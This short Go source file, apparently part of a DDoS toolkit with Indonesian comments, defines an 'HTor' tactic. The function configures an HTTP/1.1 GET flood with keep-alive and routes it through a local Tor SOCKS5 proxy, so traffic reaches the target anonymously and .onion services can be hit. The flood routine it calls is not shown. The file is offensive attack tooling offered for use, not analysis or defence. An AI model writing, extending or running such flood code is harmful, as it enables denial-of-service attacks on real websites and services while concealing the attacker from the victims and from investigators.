package tactics

import (
	"context"
	"os"
)

// HTor — flood melalui jaringan Tor (SOCKS5 lokal 127.0.0.1:9050).
// Node wajib menjalankan Tor daemon. Traffic memantul via Tor sebelum ke target
// (mendukung .onion). Koneksi Tor butuh warm-up awal.
func HTor(ctx context.Context, p Params) (int64, error) {
	socks := os.Getenv("TOR_SOCKS")
	if socks == "" {
		socks = "socks5://127.0.0.1:9050"
	}
	cfg := floodConfig{
		httpMethod: "GET",
		http2:      false, // Tor exit tidak mendukung h2; pakai HTTP/1.1
		keepAlive:  true,
		proxyURL:   socks,
	}
	return runFlood(ctx, p, cfg)
}
